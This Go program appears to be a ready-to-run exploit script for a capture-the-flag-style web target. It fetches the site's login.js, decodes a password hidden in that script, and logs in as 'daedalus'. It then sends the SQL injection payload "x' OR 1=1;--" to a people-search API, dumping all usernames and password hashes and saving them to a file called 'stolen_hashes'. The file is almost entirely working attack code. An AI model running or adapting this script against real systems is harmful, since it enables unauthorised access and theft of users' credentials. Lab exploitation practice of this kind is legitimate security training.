package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type AScruct struct {
	Letter  string
	Choices []string
}

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

type CookieJar struct {
	jar map[string][]*http.Cookie
}

type PeopleReturn struct {
	Returned []People
}

type People struct {
	Data []Person
}

type Person struct {
	Name     string `json:"namePeople"`
	Password string `json:"passwordPeople"`
}

func cleanLetter(letter string) (cleaned_letter string) {
	cleaned_letter = strings.TrimSpace(letter)
	cleaned_letter = strings.TrimLeft(cleaned_letter, "[")
	cleaned_letter = strings.TrimLeft(cleaned_letter, "\"")
	cleaned_letter = strings.TrimRight(cleaned_letter, "]")
	cleaned_letter = strings.TrimRight(cleaned_letter, "\"")
	return cleaned_letter
}

func getContent(filename string) (content []byte, success bool, message string) {
	rptr, err := os.Open(filename)
	if err != nil {
		return nil, false, err.Error()
	}
	defer rptr.Close()

	// Read JS script content
	content, err = ioutil.ReadAll(rptr)
	if err != nil {
		return nil, false, err.Error()
	}

	return content, true, "content successfully pulled"
}

func pullArrays(loginScript string, arrayDict *[]AScruct) (success bool, message string) {
	var choices_str string

	arr_pattern := `[a-zA-Z] = \[.*\]`

	// Setup lookup array regex
	re_arr, err := regexp.Compile(arr_pattern)
	if err != nil {
		return false, err.Error()
	}

	content, success, message := getContent(loginScript)
	if !success {
		return false, message
	}

	// Create slice of lookup arrays
	arrays := re_arr.FindAll(content, -1)
	for _, val := range arrays {
		split_val := strings.Split(string(val), "=")
		choices_str = split_val[1]
		choices_arr := strings.Split(choices_str, ",")
		for i := range choices_arr {
			choices_arr[i] = cleanLetter(choices_arr[i])
		}
		*arrayDict = append(*arrayDict, AScruct{Letter: strings.TrimSpace(split_val[0]), Choices: choices_arr})
	}

	return true, "arrays successfully pulled out of script"
}

func pullPassword(loginScript string) (password string, success bool, message string) {
	pass_pattern := `([a-zA-Z]\[[0-9]+\]\+)+[a-zA-Z]\[[0-9]+\]`

	// Setup password code regex
	re_pass, err := regexp.Compile(pass_pattern)
	if err != nil {
		return "", false, err.Error()
	}

	content, success, message := getContent(loginScript)
	if !success {
		return "", false, message
	}

	// Find JS code that builds out the password
	password_formula := re_pass.FindAll(content, -1)

	return string(password_formula[0]), true, "encoded password successfully pulled out of script"
}

func DecodePassword(loginScript string) (password string, success bool, message string) {
	var astructSlice []AScruct

	success, message = pullArrays(loginScript, &astructSlice)
	if !success {
		return "", false, message
	}

	passwordEnc, success, message := pullPassword(loginScript)
	if !success {
		return "", false, message
	}
	passwordEncSplit := strings.Split(passwordEnc, "+")

	// loop to build the password
	for _, cur_pass_letter := range passwordEncSplit {
		// break a[#] into a #.
		split_result := strings.Split(cur_pass_letter, "[")
		split_result_letter := split_result[0]
		split_result_number, _ := strconv.Atoi(strings.Split(split_result[1], "]")[0])

		// search for correct array and extract password letter from array.
		for i := range astructSlice {
			if strings.Compare(astructSlice[i].Letter, split_result_letter) == 0 {
				password = fmt.Sprintf("%s%s", password, astructSlice[i].Choices[split_result_number])
				break
			}
		}
	}

	return password, true, "password successfully decoded"
}

func SaveFile(outfile string, content []byte) (success bool) {
	SysMsgNB(fmt.Sprintf("saving content to \"%s\"", outfile))
	fptr, err := os.Create(outfile)
	if err != nil {
		return false
	}
	defer fptr.Close()

	_, err = fptr.Write(content)
	if err != nil {
		return false
	}

	return true
}

func (c *Client) ConfirmUPAccess() (success bool, message string) {
	// confirm access to user pannel
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/index.html", c.baseURL), nil)
	if err != nil {
		return false, err.Error()
	}

	SysMsgNB("confirming access to user pannel")
	resp, err := c.Session.Do(req)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	resBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err.Error()
	}

	upPat := "<title>User Pannel</title>"
	re, err := regexp.Compile(upPat)
	if err != nil {
		return false, err.Error()
	}

	matches := re.FindAll(resBody, -1)
	if len(matches) < 1 {
		return false, "Unable to confirm access to user pannel"
	}

	return true, "user pannel access confirmed"
}

func (c *Client) GetScript(outfile string) (success bool, message string) {
	SysMsgNB("creating request object")
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/js/login.js", c.baseURL), nil)
	if err != nil {
		return false, err.Error()
	}

	SysMsgNB("sending request to target")
	resp, err := c.Session.Do(req)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	content, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err.Error()
	}

	success = SaveFile(outfile, content)
	if !success {
		return false, fmt.Sprintf("unable to save content to \"%s\"", outfile)
	}

	return true, "login script successfully pulled down"
}

func (c *Client) Login(username string, password string) (success bool, message string) {
	targetURL := fmt.Sprintf("%s/login.php", c.baseURL)
	formData := fmt.Sprintf("email=%s&password=%s", username, password)

	// attempt login
	SysMsgNB("attempting login")
	resp, err := c.Session.Post(targetURL, "application/x-www-form-urlencoded", strings.NewReader(formData))
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	cookieURL, err := url.Parse(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	c.Session.Jar.SetCookies(cookieURL, resp.Cookies())

	success, message = c.ConfirmUPAccess()
	if !success {
		return success, message
	}

	return true, "login successful"
}

func (c *Client) SQLiAttack() (creds []Person, success bool, message string) {
	var jsonPeople = [][]*Person{}
	var credsArray []Person

	targetURL := fmt.Sprintf("%s/api/people/search", c.baseURL)
	sqli_string := "x' OR 1=1;--"
	bodyString := fmt.Sprintf("namePeople=%s", sqli_string)

	SysMsgNB("attempting SQLi attack")
	resp, err := c.Session.Post(targetURL, "application/x-www-form-urlencoded", strings.NewReader(bodyString))
	if err != nil {
		return nil, false, err.Error()
	}
	defer resp.Body.Close()

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, false, err.Error()
	}

	json.Unmarshal(respBody, &jsonPeople)
	for i := range jsonPeople[0] {
		credsArray = append(credsArray, *jsonPeople[0][i])
	}
	return credsArray, true, "SQLi successful"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SaveHashes(creds []Person) (success bool, message string) {
	const filename string = "stolen_hashes"

	SysMsgNB(fmt.Sprintf("saving stolen hashes to \"%s\"", filename))

	fptr, err := os.Create(filename)
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	for i := range creds {
		fptr.Write([]byte(fmt.Sprintf("%s\n", creds[i].Password)))
	}

	return true, fmt.Sprintf("password hashes saved to \"%s\"", filename)
}

func main() {
	var targetPort int
	var targetIP string
	var baseURL string
	var scriptName string

	flag.StringVar(&targetIP, "i", "127.0.0.1", "target IP address")
	flag.IntVar(&targetPort, "p", 80, "target port")
	flag.StringVar(&scriptName, "s", "login.js", "filename to save pulled down js file under")

	flag.Parse()

	baseURL = fmt.Sprintf("http://%s:%d", targetIP, targetPort)
	InfMsg(fmt.Sprintf("Base URL: %s", baseURL))

	c := Client{baseURL: baseURL, Session: &http.Client{Timeout: 30 * time.Second}}
	c.Route = "js/login.js"
	sessionjar, err := cookiejar.New(nil)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	c.Session.Jar = sessionjar

	success, message := c.GetScript(scriptName)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	password, success, message := DecodePassword(scriptName)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(fmt.Sprintf("Login Credentials: \"daedalus:%s\"", password))

	success, message = c.Login("daedalus", password)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	creds, success, message := c.SQLiAttack()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	// display stolen creds
	for i := range creds {
		SucMsg(fmt.Sprintf("%s:%s", creds[i].Name, creds[i].Password))
	}
	success, message = SaveHashes(creds)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)
	return
}

